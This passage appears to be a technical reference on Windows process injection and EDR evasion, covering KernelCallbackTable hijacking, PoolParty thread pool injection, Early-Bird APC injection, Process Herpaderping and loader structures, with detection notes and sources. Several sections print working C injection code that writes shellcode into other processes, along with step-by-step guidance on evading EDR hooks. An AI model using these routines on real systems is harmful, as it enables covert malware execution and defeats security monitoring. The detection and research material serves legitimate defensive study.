  6    __fnGETTEXTLENGTHS        WM_GETTEXTLENGTH
  7    __fnINCNTOUTSTRING        WM_GETTEXT
  8    __fnPOUTLPINT             WM_GETDLGCODE
  9    __fnINLPCOMPAREITEMSTRUCT WM_COMPAREITEM
 10    __fnINLPCREATESTRUCT      WM_CREATE / WM_NCCREATE
 11    __fnINLPDELETEITEMSTRUCT  WM_DELETEITEM
 12    __fnINLPDRAWITEMSTRUCT    WM_DRAWITEM
 13    __fnPOPTINLPUINT          WM_SIZING
 14    __fnPOPTINLPUINT2         WM_MOVING
 15    __fnINLPMDICREATESTRUCT   WM_MDICREATE
 16    __fnINOUTLPMEASUREITEMSTRUCT WM_MEASUREITEM
 17    __fnINLPWINDOWPOS         WM_WINDOWPOSCHANGED
 18    __fnINOUTLPPOINT5         WM_NCHITTEST
 19    __fnINOUTLPSCROLLINFO    WM_GETSCROLLINFO
 20    __fnINOUTLPRECT           WM_GETMINMAXINFO
 21    __fnINOUTNCCALCSIZE       WM_NCCALCSIZE
 22    __fnINPAINTCLIPBRD        WM_PAINTCLIPBOARD
 23    __fnINSIZECLIPBRD         WM_SIZECLIPBOARD
...
     __ClientCopyDDEIn1
     __ClientCopyDDEIn2
     __ClientCopyDDEOut1
     __ClientCopyDDEOut2
```

Indices and total count vary between Windows versions.

### 6.3 Injection technique

```c
// 1. Get PEB of target GUI process
PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

// 2. Read KernelCallbackTable pointer from PEB
PVOID kctPtr;
ReadProcessMemory(hProc, (BYTE*)pbi.PebBaseAddress + 0x58, &kctPtr, 8, NULL);

// 3. Read existing table
PVOID kct[256];
ReadProcessMemory(hProc, kctPtr, kct, sizeof(kct), NULL);

// 4. Allocate shellcode + malicious table in target
PVOID shellcode = VirtualAllocEx(hProc, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, shellcode, buf, shellSize, NULL);

// 5. Copy original table, replace fnCOPYDATA (index 0)
PVOID newKct = VirtualAllocEx(hProc, NULL, sizeof(kct), MEM_COMMIT, PAGE_READWRITE);
kct[0] = shellcode;   // __fnCOPYDATA at index 0
WriteProcessMemory(hProc, newKct, kct, sizeof(kct), NULL);

// 6. Update PEB.KernelCallbackTable
WriteProcessMemory(hProc, (BYTE*)pbi.PebBaseAddress + 0x58, &newKct, 8, NULL);

// 7. Trigger via WM_COPYDATA to any window owned by target process
SendMessage(targetHwnd, WM_COPYDATA, ...);
```

### 6.4 EDR detection

- Monitor PEB cross-process writes (`WriteProcessMemory` targeting `PEB+0x58`).
- Validate that `KernelCallbackTable` pointer lies within the `user32.dll` image range.
- `PsSetLoadImageNotifyRoutine` + `MmGetSystemRoutineAddress` to get user32 base and check
  KCT alignment.
- Known threat actors: FinFisher, Lazarus Group.
- Only affects GUI processes (user32 loaded).

---

## 7. Thread Pool Injection (PoolParty)

### 7.1 Thread pool architecture

Windows provides a default thread pool per process. Worker threads sit in:
```
ntdll!TppWorkerThread
  -> NtWaitForWorkViaWorkerFactory  (syscall — suspends until work arrives)
  -> executes work item callback
  -> loops back
```

The kernel-side `WORKER_FACTORY` object manages these threads. User-side handle returned
by `CreateThreadpool`.

### 7.2 Key structures

**TP_CALLBACK_ENVIRON (user-mode, winnt.h):**
```c
typedef struct _TP_CALLBACK_ENVIRON_V3 {
    TP_VERSION                 Version;       // = 3
    PTP_POOL                   Pool;          // Thread pool handle
    PTP_CLEANUP_GROUP          CleanupGroup;
    PTP_CLEANUP_GROUP_CANCEL_CALLBACK CleanupGroupCancelCallback;
    PVOID                      RaceDll;
    struct _ACTIVATION_CONTEXT *ActivationContext;
    PTP_SIMPLE_CALLBACK        FinalizationCallback;
    union {
        DWORD                  Flags;
        struct { DWORD LongFunction : 1; DWORD Persistent : 1; /* ... */ };
    } u;
    TP_CALLBACK_PRIORITY       CallbackPriority;
    DWORD                      Size;
} TP_CALLBACK_ENVIRON_V3;
```

**Kernel-side work item types (PoolParty targets):**
```
TP_WORK     — simple callback work
TP_TIMER    — timer-based callback
TP_WAIT     — waitable object callback
TP_IO       — I/O completion callback
TP_ALPC     — ALPC message callback
TP_JOB      — job object callback
TP_DIRECT   — direct queue insertion (no proxy object needed)
```

### 7.3 NtSetInformationWorkerFactory

This undocumented syscall controls the worker factory:

```c
// WorkerFactoryBasicInformation = class 0
// WorkerFactoryThreadMinimum    = class 1  ← used in PoolParty Variant 1
// WorkerFactoryStartRoutine     = class 2  ← directly controls start routine
// WorkerFactoryMaxThread        = class 4

NtSetInformationWorkerFactory(
    HANDLE WorkerFactoryHandle,
    WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength
);
```

**Variant 1 — WorkerFactory start routine hijack:**
```c
// Write shellcode address as new start routine
PVOID shellcode = ...; // injected into target process
NtSetInformationWorkerFactory(hFactory, WorkerFactoryStartRoutine, &shellcode, 8);
// Increase minimum threads to trigger creation of new worker → executes shellcode
ULONG minThreads = currentThreads + 1;
NtSetInformationWorkerFactory(hFactory, WorkerFactoryThreadMinimum, &minThreads, 4);
```

**Variant 2 — TP_WORK task queue injection:**
Overwrite the callback pointer in a `TP_WORK` structure in the target process, then submit
the work item. The overwrite uses `WriteProcessMemory`; execution is triggered by
`SubmitThreadpoolWork` from within the target or by the system.

**Variants 3–7 (I/O completion queue):**
Associate `TP_WAIT`, `TP_ALPC`, `TP_JOB`, etc. with legitimate Windows objects; overwrite
callback pointer; trigger the associated event (e.g. set a waitable event, write to a file,
assign a job). Execution appears as legitimate I/O completion handling.

**Variant 8 — Timer queue:**
Inject shellcode address into a `TP_TIMER` structure; fire the timer.

### 7.4 EDR bypass comparison vs CreateRemoteThread

| Attribute | CreateRemoteThread | PoolParty |
|-----------|-------------------|-----------|
| Thread creation | Explicit; triggers `PsSetCreateThreadNotifyRoutine` | None (existing worker threads) |
| Visible in ETW | Yes (`Microsoft-Windows-Kernel-Process` provider) | No new thread events |
| NtCreateThreadEx syscall | Yes | No |
| Memory allocation required | Yes | Yes (for shellcode) |
| EDR hook bypass | No | Yes — no thread-creation primitive |
| Execution trigger | Direct | Legitimate OS operation (file write, event signal, etc.) |

All 8 PoolParty variants were tested against 5 leading EDR products and bypassed detection
(Black Hat Europe 2023, SafeBreach Labs).

---

## 8. Early-Bird APC Injection

### 8.1 Process initialization timeline

When a process is created and the first thread starts, the execution sequence is:

```
KiUserApcDispatcher
  -> ntdll!LdrInitializeThunk
     -> ntdll!LdrpInitialize
        -> ntdll!_LdrpInitialize
           -> ... (heap, TLS, etc. setup)
           -> TLS callbacks execute   ← TLS runs BEFORE APCs drain
           -> ntdll!ZwTestAlert       ← kernel checks APC queue; dispatches user APCs
              -> KiUserApcDispatcher (for each queued APC)
           -> ntdll!LdrpInitializeProcess
              -> Load DLLs (DLL_PROCESS_ATTACH callbacks)
              -> EDR DLL injected here via PsSetLoadImageNotifyRoutine
     -> Process entry point (main/WinMain)
```

**Key ordering:** APC fires at `ZwTestAlert` → **before** DLL_PROCESS_ATTACH of any DLL
(including the EDR's DLL) → **after** TLS callbacks.

### 8.2 Injection steps

```c
// 1. Create target process in suspended state
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Allocate and write shellcode in new process
LPVOID shellAddr = VirtualAllocEx(pi.hProcess, NULL, shellSize,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, shellAddr, shellcode, shellSize, NULL);

// 3. Queue APC to the main (and only) thread — still in suspended state
QueueUserAPC((PAPCFUNC)shellAddr, pi.hThread, 0);

// 4. Resume thread — APC fires during LdrInitializeThunk before any EDR hooks load
ResumeThread(pi.hThread);
```

### 8.3 Why it bypasses EDR hooks

EDRs that rely on **DLL injection** to hook APIs (the most common model) inject their
monitoring DLL via `PsSetLoadImageNotifyRoutine`. This callback fires when a new image is
mapped, but the EDR DLL's `DllMain(DLL_PROCESS_ATTACH)` runs as part of `LdrpInitializeProcess`,
which happens **after** `ZwTestAlert` in the initialization sequence. Therefore:

- Shellcode queued as APC executes at `ZwTestAlert` time.
- EDR's userland hooks do not yet exist.
- The shellcode runs before any API hooking is in place.

**Limitation:** EDR kernel callbacks (`PsSetCreateProcessNotifyRoutineEx`,
`PsSetCreateThreadNotifyRoutine`) fire at process/thread creation and may detect the
injection from the injecting process's API calls (`VirtualAllocEx`, `WriteProcessMemory`,
`QueueUserAPC`, etc.) regardless of when the payload executes.

### 8.4 Variants and improvements

- **Early Cascade Injection** (Outflank, 2024): No remote execution primitive at all.
  Instead of `QueueUserAPC`, abuses `NtCreateSection` + `NtMapViewOfSection` to share
  a writable section with the target, then overwrites a function pointer the target calls
  during early init. No `WriteProcessMemory` call at all — harder to detect.

- **Early Cryo Bird**: Uses `NtSetInformationJobObject` with an undocumented information
  class to freeze the process (avoid `CREATE_SUSPENDED` flag detection), then injects.

---

## 9. Process Herpaderping (Image Masking)

### 9.1 Exact syscall sequence

```
1.  OpenFile / NtOpenFile (GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ)
    — Open target executable with write access while keeping file handle open

2.  WriteFile / NtWriteFile
    — Write malicious payload (shellcode/PE) into the file

3.  NtCreateSection (SEC_IMAGE, PAGE_READONLY)
    — Map the file as an executable image section
    — Windows caches this image mapping in the file object's
      SECTION_OBJECT_POINTERS->ImageSectionObject

4.  NtCreateProcessEx (SectionHandle = section from step 3)
    — Creates EPROCESS; the section is fixed to this process

5.  WriteFile (again, to the same open handle)
    — Overwrite the on-disk file with benign/decoy content
    — The cached section object is NOT invalidated; it still references the original payload

6.  NtCreateThreadEx
    — Creates initial thread → TRIGGERS PsSetCreateProcessNotifyRoutineEx callback
    — Security products inspect the file at this point and see the DECOY content

7.  CloseHandle (file handle) → triggers IRP_MJ_CLEANUP
    — File may be restored to benign state or remain modified
```

### 9.2 Differences: Herpaderping vs Ghosting vs Doppelganging

| Technique | File State at Callback | Transactions | File Deleted | Detection via MappedFileName |
|-----------|------------------------|--------------|--------------|------------------------------|
| Herpaderping | File on disk = DECOY; section = payload | None | No | Path is valid; content mismatch |
| Ghosting | File deleted after section creation | None (delete-on-close) | Yes | MappedFileName returns empty/NULL |
| Doppelganging | File content restored (TxF rollback) | Yes (TxF) | No (rolled back) | Path valid; TxF-based mismatch |

### 9.3 Detection via NtQueryVirtualMemory MappedFileName

```c
// Get the mapped filename of the process's main executable section
MEMORY_MAPPED_FILE_NAME_INFORMATION info;
NtQueryVirtualMemory(hProcess, baseAddress, MemoryMappedFilenameInformation,
                     &info, sizeof(info), &retLen);
// Herpaderping: info.FileName is valid (e.g. L"\\Device\\HarddiskVolume3\\temp\\payload.exe")
// Ghosting:     info.FileName is empty (file was deleted)
// Doppelganging: info.FileName may be valid but content mismatches on disk
```

**Deeper detection — content coherency check:**
Read the process's module image from virtual memory and compare against the on-disk file
byte-by-byte. For Herpaderping, these will differ (payload in memory, decoy on disk). This
is what tools like Process Hacker / System Informer implement.

### 9.4 PsSetCreateProcessNotifyRoutineEx timing gap

Security products registered via `PsSetCreateProcessNotifyRoutineEx` receive the callback
when the initial thread is inserted (`NtCreateThreadEx`), not when the process object is
created (`NtCreateProcessEx`). This gap is exactly what Herpaderping exploits — steps 1–5
happen before any security callback fires.

---

## 10. LDR_DATA_TABLE_ENTRY Structure

### 10.1 Complete layout (x64, Windows 10 1909 / Windows 11, 0x120 bytes)

```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    /* 0x000 */ LIST_ENTRY InLoadOrderLinks;         // PEB_LDR_DATA.InLoadOrderModuleList
    /* 0x010 */ LIST_ENTRY InMemoryOrderLinks;       // PEB_LDR_DATA.InMemoryOrderModuleList
    /* 0x020 */ LIST_ENTRY InInitializationOrderLinks; // PEB_LDR_DATA.InInitializationOrderModuleList
    /* 0x030 */ PVOID      DllBase;                  // Module base address
    /* 0x038 */ PVOID      EntryPoint;               // DLL entry point (DllMain)
    /* 0x040 */ ULONG      SizeOfImage;              // Size of mapped image
    /* 0x044 */ ULONG      _pad;
    /* 0x048 */ UNICODE_STRING FullDllName;          // Full path e.g. L"C:\Windows\System32\ntdll.dll"
    /* 0x058 */ UNICODE_STRING BaseDllName;          // Filename e.g. L"ntdll.dll"
    /* 0x068 */ union {
                    ULONG  FlagGroup[4];
                    ULONG  Flags;                    // Load status flags
                };
    /* 0x06C */ USHORT     ObsoleteLoadCount;        // Reference count (legacy; now in DdagNode)
    /* 0x06E */ USHORT     TlsIndex;
    /* 0x070 */ LIST_ENTRY HashLinks;                // Links in LdrpHashTable[hash(BaseDllName)]
    /* 0x080 */ ULONG      TimeDateStamp;            // From PE header; used for version checking
    /* 0x084 */ ULONG      _pad2;
    /* 0x088 */ PVOID      EntryPointActivationContext;
    /* 0x090 */ PVOID      Lock;                     // Per-module lock
    /* 0x098 */ LDR_DDAG_NODE* DdagNode;            // Dependency DAG node
    /* 0x0A0 */ LIST_ENTRY NodeModuleLink;
    /* 0x0B0 */ LDRP_LOAD_CONTEXT* LoadContext;
    /* 0x0B8 */ PVOID      ParentDllBase;
    /* 0x0C0 */ PVOID      SwitchBackContext;
    /* 0x0C8 */ RTL_BALANCED_NODE BaseAddressIndexNode; // In LdrpModuleBaseAddressIndex
    /* 0x0E0 */ RTL_BALANCED_NODE MappingInfoIndexNode;
    /* 0x0F8 */ ULONGLONG  OriginalBase;             // Preferred base (pre-relocation)
    /* 0x100 */ LARGE_INTEGER LoadTime;
    /* 0x108 */ ULONG      BaseNameHashValue;        // ROR13 hash of BaseDllName
    /* 0x10C */ LDR_DLL_LOAD_REASON LoadReason;     // enum: StaticDependency, DynamicLoad, etc.
    /* 0x110 */ ULONG      ImplicitPathOptions;
    /* 0x114 */ ULONG      ReferenceCount;
    /* 0x118 */ ULONG      DependentLoadFlags;
    /* 0x11C */ UCHAR      SigningLevel;             // Code signing level
    /* 0x11D - 0x11F: padding */
} LDR_DATA_TABLE_ENTRY;  // sizeof = 0x120
```

### 10.2 PEB.Ldr traversal

```c
// PEB.Ldr at PEB+0x018 (x64)
PEB_LDR_DATA* ldr = (PEB_LDR_DATA*)(*((PVOID*)((PBYTE)peb + 0x18)));

// ldr->InMemoryOrderModuleList.Flink points to LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks
// (note: offset of InMemoryOrderLinks within LDR_DATA_TABLE_ENTRY is 0x10)
// so subtract 0x10 to get to DllBase:

for (LIST_ENTRY* e = ldr->InMemoryOrderModuleList.Flink;
     e != &ldr->InMemoryOrderModuleList;
     e = e->Flink) {
    LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    // entry->DllBase, entry->BaseDllName, entry->TimeDateStamp
}
```

**Standard iteration order for first 3 entries (InMemoryOrderModuleList):**
1. Process executable itself
2. ntdll.dll
3. kernel32.dll  ← reflective loaders typically stop here to get LoadLibrary/GetProcAddress

### 10.3 HashLinks and LdrpHashTable

`LdrpHashTable` is an array of 32 (`LDR_HASH_TABLE_ENTRIES_COUNT`) `LIST_ENTRY` heads.
Hash is computed as ROR13 of the Unicode lowercase DLL name, modulo 32.
`LDR_DATA_TABLE_ENTRY.BaseNameHashValue` stores this precomputed hash.

EDR/AV tools that scan for loaded modules by walking `LdrpHashTable` (instead of or in
addition to the `PEB.Ldr` lists) can still find entries even if the main module lists are
manipulated.

### 10.4 TimeDateStamp for version checking

`TimeDateStamp` at offset 0x080 is copied from the PE header's `IMAGE_FILE_HEADER.TimeDateStamp`.
Security tools use this to verify the expected build/version of loaded DLLs and detect
module stomping (where `DllBase` content differs from the expected PE but the LDR entry
remains).

### 10.5 Reflective DLL injection and LDR bypass

Classic reflective DLL injection (`ReflectiveDLLInjection` by Stephen Fewer):

1. DLL allocates itself in target via `VirtualAllocEx`.
2. `ReflectiveLoader` (embedded function at known offset) performs:
   - Manual PE mapping (headers, sections, imports, relocations)
   - Resolves `LoadLibrary`/`GetProcAddress` by walking PEB module list
   - Calls `DllMain(DLL_PROCESS_ATTACH)`
3. **No `LDR_DATA_TABLE_ENTRY` is created** — the DLL is invisible to PEB walks.

**Detection methods:**
- PEB module list walk (misses reflective DLLs — this is the bypass).
- Memory scanning for unexpected PE headers (`MZ` + valid `NT_HEADERS`) in
  `PAGE_EXECUTE_*` regions not backed by known modules.
- `NtQueryVirtualMemory(MemoryMappedFilenameInformation)` returns NULL for
  reflectively loaded DLLs (no file backing).
- Thread call stack analysis: threads executing inside unbacked memory regions.
- `LdrpModuleBaseAddressIndex` (RTL_RB_TREE) — reflective DLLs are absent here too.

**Advanced evasion:** Some reflective loaders do add a fake `LDR_DATA_TABLE_ENTRY` to all
three module lists and `LdrpHashTable` to appear legitimate. In that case, EDR must verify
that the module's `DllBase` content actually matches the file referenced in `FullDllName`
(i.e., coherency checking).

---

## Reference: Key Structure Source Locations

| Topic | Primary References |
|-------|--------------------|
| _WMI_LOGGER_CONTEXT | geoffchappell.com, vergiliusproject.com, connormcgarr.github.io/securitytrace-etw-ppl |
| _ETW_GUID_ENTRY / _ETW_REG_ENTRY | geoffchappell.com, fluxsec.red (full spectrum ETW detection) |
| ETW evasion (Lazarus FudModule) | gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit |
| _ETW_SILODRIVERSTATE | geoffchappell.com, vergiliusproject.com |
| EPROCESS offsets | vergiliusproject.com (per-version), keramas.github.io/2020/06/21 |
| PS_PROTECTION | itm4n.github.io/lsass-runasppl |
| MitigationFlags | geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/mitigationflags |
| CET / Shadow Stack | windows-internals.com/cet-on-windows, connormcgarr.github.io/km-shadow-stacks |
| ALPC internals | csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC |
| WdFilter comm ports | n4r1b.com/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1 |
| Filter comm ports | windows-internals.com/investigating-filter-communication-ports |
| WNF | blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf, pwnedcoffee.com/blog/wnf-chronicles-i-introduction |
| WNF injection | blog.trailofbits.com/2023/05/15/introducing-windows-notification-facilitys-wnf-code-integrity |
| KernelCallbackTable | captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection, 0xHossam/KernelCallbackTable-Injection-PoC |
| PoolParty thread pool injection | safebreach.com/blog/process-injection-using-windows-thread-pools, securityboulevard.com poolparty writeup |
| Early-Bird APC | ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection, cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered |
| Early Cascade | outflank.nl/blog/2024/10/15/introducing-early-cascade-injection |
| Herpaderping | jxy-s.github.io/herpaderping, huntandhackett.com/blog/concealed-code-execution-techniques-and-detection |
| LDR_DATA_TABLE_ENTRY | geoffchappell.com, vergiliusproject.com, malwaretech.com/wiki/locating-modules-via-the-peb-x64 |
| PDB offset resolution | medium.com/@s12deff/kernel-dynamic-offset-resolution-using-pdb-symbols |
